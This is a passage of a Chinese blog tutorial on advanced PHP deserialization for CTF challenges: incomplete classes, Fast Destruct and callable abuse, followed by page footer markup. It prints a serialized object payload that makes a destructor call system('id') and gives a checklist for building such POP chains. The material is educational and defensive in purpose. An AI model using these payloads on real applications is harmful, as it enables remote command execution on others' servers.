+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:4:&quot;User&quot;:2:&#123;s:8:&quot;callback&quot;;s:6:&quot;system&quot;;s:3:&quot;arg&quot;;s:2:&quot;id&quot;;&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>执行链：</p>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">unserialize()</span><br><span class="line">  -&gt; 生成 User 对象</span><br><span class="line">  -&gt; 请求结束触发 User::__destruct()</span><br><span class="line">  -&gt; is_callable(&#x27;system&#x27;) 为 true</span><br><span class="line">  -&gt; call_user_func(&#x27;system&#x27;, &#x27;id&#x27;)</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="4-三个技巧如何组合理解"><a href="#4-三个技巧如何组合理解" class="headerlink" title="4. 三个技巧如何组合理解"></a>4. 三个技巧如何组合理解</h2><p>这三个技巧解决的是不同问题。</p>
+<table>
+<thead>
+<tr>
+<th>技巧</th>
+<th>解决的问题</th>
+<th>常见位置</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>不完整类</td>
+<td>类不存在时如何通过检查</td>
+<td><code>serialize(unserialize($x))</code></td>
+</tr>
+<tr>
+<td>Fast Destruct</td>
+<td>如何提前触发析构</td>
+<td>数组重复键覆盖</td>
+</tr>
+<tr>
+<td>Callable</td>
+<td>如何把可控属性变成函数调用</td>
+<td><code>call_user_func()</code>、<code>($x)()</code></td>
+</tr>
+</tbody></table>
+<p>可以用一条链路理解它们：</p>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">第一阶段：</span><br><span class="line">目标类还没加载</span><br><span class="line">  -&gt; 用 __PHP_Incomplete_Class 通过 serialize(unserialize($x)) 检查</span><br><span class="line"></span><br><span class="line">第二阶段：</span><br><span class="line">目标类已经加载</span><br><span class="line">  -&gt; 反序列化出真实对象</span><br><span class="line">  -&gt; 如果需要提前触发析构，用 Fast Destruct</span><br><span class="line"></span><br><span class="line">触发阶段：</span><br><span class="line">__destruct()、__invoke() 或其他方法中出现 callable</span><br><span class="line">  -&gt; 控制 callback 和参数</span><br><span class="line">  -&gt; 调用目标函数或目标方法</span><br></pre></td></tr></table></figure></div>
+
+<p>注意它们不是固定一起用的。</p>
+<p>有些题只考不完整类，有些题只考 Fast Destruct，有些题只考 callable。真正做题时，要先看源码的数据流和类加载顺序。</p>
+<h2 id="5-解题思路"><a href="#5-解题思路" class="headerlink" title="5. 解题思路"></a>5. 解题思路</h2><p>看到 PHP 反序列化题时，可以按下面顺序看。</p>
+<ol>
+<li>有没有 <code>unserialize()</code>，参数是否可控。</li>
+<li>有没有 <code>serialize(unserialize($x))</code> 这种稳定性检查。</li>
+<li>检查阶段目标类是否已经定义。</li>
+<li>检查后是否又定义类、加载文件、再次 <code>unserialize()</code>。</li>
+<li>利用点是否在 <code>__destruct()</code>。</li>
+<li>是否需要 Fast Destruct 抢在后续逻辑之前触发。</li>
+<li>代码中有没有 <code>call_user_func()</code>、<code>call_user_func_array()</code>、<code>($x)()</code>、<code>is_callable()</code>。</li>
+<li>callable 的函数名、对象、方法名、参数是否能通过属性控制。</li>
+<li>如果是 private 或 protected 属性，注意序列化属性名格式。</li>
+<li>如果 payload 要通过稳定性检查，注意字符串长度、属性数量和尾部数据必须标准。</li>
+</ol>
+<h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6. 总结"></a>6. 总结</h2><p><code>__PHP_Incomplete_Class</code> 的关键是“类不存在但信息还在”。它适合绕过 <code>serialize(unserialize($x)) != $x</code> 这类稳定性检查，因为不完整类再序列化后可能恢复原始对象字符串。</p>
+<p>Fast Destruct 的关键是“对象失去引用就析构”。它通过数组重复键覆盖等方式，让 <code>__destruct()</code> 提前触发，常用于抢在后续检查、属性修改或流程中断之前执行利用逻辑。</p>
+<p>Callable 的关键是“可控属性被当成函数或方法调用”。如果 <code>callback</code> 和参数都能被反序列化控制，<code>call_user_func()</code>、<code>call_user_func_array()</code>、<code>($x)()</code> 这类代码就可能成为 POP 链中的关键跳板。</p>
+<p>一句话串起来：</p>
+<div class="code-container" data-rel="Text"><figure class="iseeu highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">不完整类负责过检查，Fast Destruct 负责抢时机，Callable 负责把属性变成调用。</span><br></pre></td></tr></table></figure></div>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> 反序列化进阶</li>
+        <li><strong>作者:</strong> The Redefine Team</li>
+        <li><strong>创建于
+                :</strong> 2026-08-14 17:55:00</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2026-08-14 17:55:54
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://redefine.ohevan.com/2026/08/14/反序列化进阶/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/web/">#web</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2026/08/14/PHP-%E4%B8%8D%E5%AE%8C%E6%95%B4%E7%B1%BB%E7%BB%95%E8%BF%87serialize-unserialize-x-x/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">PHP 不完整类绕过serialize(unserialize($x)) != $x</span>
+						<span class="post-nav-item">上一篇</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2026/08/14/SQL-quine%E6%B3%A8%E5%85%A5/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">SQL quine注入</span>
+						<span class="post-nav-item">下一篇</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+		<div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+			<div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        评论
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.js';
+
+      (function() {
+        const startPath = location.pathname;
+        const startTime = Date.now();
+        const retryDelay = 200;
+        const retryLimit = 5000;
+
+        const runWaline = () => {
+          if (location.pathname !== startPath) {
+            return;
+          }
+
+          const container = document.getElementById('waline');
+          if (!container) {
+            if (Date.now() - startTime < retryLimit) {
+              setTimeout(runWaline, retryDelay);
+            }
+            return;
+          }
+
+          if (window.redefineWalineInstance?.destroy) {
+            window.redefineWalineInstance.destroy();
+          }
+
+          container.innerHTML = '';
+          window.redefineWalineInstance = init({
+            el: '#waline',
+            serverURL: 'https://example.example.com',
+            path: location.pathname,
+            dark: 'body[class~="dark-mode"]',
+            reaction: false,
+            requiredMeta: ['nick', 'mail'],
+            emoji: [],
+                      lang: 'zh-CN',
+          });
+        };
+
+        runWaline();
+      })();
+    </script>
+
+
+
+        
+    
+</div>
+
+		</div>
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">目录</div>
+		<div class="page-title">反序列化进阶</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#PHP-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%9B%E9%98%B6%EF%BC%9A%E4%B8%8D%E5%AE%8C%E6%95%B4%E7%B1%BB%E3%80%81Fast-Destruct-%E4%B8%8E-Callable"><span class="nav-text">PHP 反序列化进阶：不完整类、Fast Destruct 与 Callable</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-PHP-%E4%B8%8D%E5%AE%8C%E6%95%B4%E7%B1%BB"><span class="nav-text">1. PHP 不完整类</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-1-PHP-Incomplete-Class"><span class="nav-text">1.1 __PHP_Incomplete_Class</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-2-%E5%B8%B8%E8%A7%81%E5%9C%BA%E6%99%AF"><span class="nav-text">1.2 常见场景</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-3-%E7%BB%95%E8%BF%87%E5%8E%9F%E7%90%86"><span class="nav-text">1.3 绕过原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-4-%E5%85%B8%E5%9E%8B%E9%A2%98%E7%9B%AE%E7%BB%93%E6%9E%84"><span class="nav-text">1.4 典型题目结构</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-Fast-Destruct"><span class="nav-text">2. Fast Destruct</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-1-%E7%AE%80%E4%BB%8B"><span class="nav-text">2.1 简介</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-2-%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86"><span class="nav-text">2.2 核心原理</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-3-%E5%AE%9E%E4%BE%8B"><span class="nav-text">2.3 实例</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-4-CTF-%E4%B8%AD%E7%9A%84%E5%88%A9%E7%94%A8"><span class="nav-text">2.4 CTF 中的利用</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-5-%E4%B8%8E-PHP-Incomplete-Class%E7%9A%84%E5%85%B3%E7%B3%BB"><span class="nav-text">2.5 与__PHP_Incomplete_Class的关系</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-6-%E6%B3%A8%E6%84%8F%E7%82%B9"><span class="nav-text">2.6 注意点</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-Callable"><span class="nav-text">3. Callable</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#3-1-%E5%AE%83%E6%98%AF%E4%BB%80%E4%B9%88"><span class="nav-text">3.1 它是什么</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-2-call-user-func"><span class="nav-text">3.2 call_user_func()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-3-call-user-func-array"><span class="nav-text">3.3 call_user_func_array()</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-4-is-callable-%E4%B8%8D%E6%98%AF%E5%AE%89%E5%85%A8%E8%BF%87%E6%BB%A4"><span class="nav-text">3.4 is_callable() 不是安全过滤</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-5-invoke-%E4%B8%8E-callable"><span class="nav-text">3.5 __invoke() 与 callable&gt; </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-6-%E4%BE%8B%E9%A2%98"><span class="nav-text">3.6 例题</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-%E4%B8%89%E4%B8%AA%E6%8A%80%E5%B7%A7%E5%A6%82%E4%BD%95%E7%BB%84%E5%90%88%E7%90%86%E8%A7%A3"><span class="nav-text">4. 三个技巧如何组合理解</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="nav-text">5. 解题思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-%E6%80%BB%E7%BB%93"><span class="nav-text">6. 总结</span></a></li></ol></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">The Redefine Team</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        共撰写了 10 篇文章
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">访问人数</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">总访问量</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
+            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.9.0</a></span>
+        </div>
+        
+        
+            <div>
+                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+		<li class="go-comment">
+			<i class="fa-regular fa-comments"></i>
+		</li>
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog fa-spin"></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container" role="dialog" aria-modal="true" aria-label="图片查看器">
+	<button class="image-viewer-close" type="button" aria-label="关闭">
+		<i class="fa-solid fa-xmark"></i>
+	</button>
+	<button class="image-viewer-prev" type="button" aria-label="上一页">
+		<i class="fa-solid fa-chevron-left"></i>
+	</button>
+	<div class="image-viewer-frame">
+		<img src="" alt="">
+	</div>
+	<div class="image-viewer-exif-panel hidden absolute left-1/2 bottom-20 -translate-x-1/2 w-[min(92vw,420px)] max-h-[60vh] overflow-hidden rounded-2xl bg-background-color-transparent-80 p-4 text-left shadow-redefine-flat backdrop-blur-md" role="dialog" aria-label="EXIF" aria-hidden="true">
+		<div class="flex items-center justify-between mb-3">
+			<span class="text-sm font-semibold text-first-text-color">EXIF</span>
+			<button class="image-viewer-exif-close flex h-8 w-8 items-center justify-center rounded-full bg-background-color-transparent-80 text-first-text-color transition hover:bg-background-color-transparent-40" type="button" aria-label="关闭">
+				<i class="fa-solid fa-xmark text-[0.65rem]"></i>
+			</button>
+		</div>
+		<div class="image-viewer-exif-cards grid grid-cols-1 sm:grid-cols-2 gap-3 max-h-[50vh] overflow-y-auto pr-1 scrollbar-hide"></div>
+		<template class="image-viewer-exif-card-template">
+			<div class="rounded-lg bg-background-color-transparent-40 px-3 py-2">
+				<div class="image-viewer-exif-card-header flex items-center gap-2 mb-1">
+					<i class="image-viewer-exif-card-icon fa-solid fa-circle-info text-xs text-third-text-color"></i>
+					<div class="image-viewer-exif-card-title text-xs font-semibold text-first-text-color"></div>
+				</div>
+				<div class="image-viewer-exif-card-items flex flex-col gap-1"></div>
+			</div>
+		</template>
+	</div>
+	<button class="image-viewer-exif-toggle flex items-center gap-2 hidden absolute left-1/2 bottom-6 -translate-x-1/2 rounded-full border border-border-color bg-background-color-transparent-80 px-4 py-2 text-first-text-color backdrop-blur-md transition hover:bg-background-color-transparent-40" type="button" aria-label="EXIF" aria-expanded="false">
+		<i class="fa-solid fa-circle-info text-xs"></i>
+		<span class="text-xs font-semibold uppercase tracking-wider">EXIF</span>
+	</button>
+	<button class="image-viewer-next" type="button" aria-label="下一页">
+		<i class="fa-solid fa-chevron-right"></i>
+	</button>
+</div>
+
+
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    window.swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+
+    window.dispatchEvent(
+        new CustomEvent("redefine:swup:ready", {
+            detail: {
+                swup: window.swup,
+            },
+        }),
+    );
+</script>
+
+
+
+
+	
+<script src="/js/build/main.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+
+	
+</body>
+
+</html>
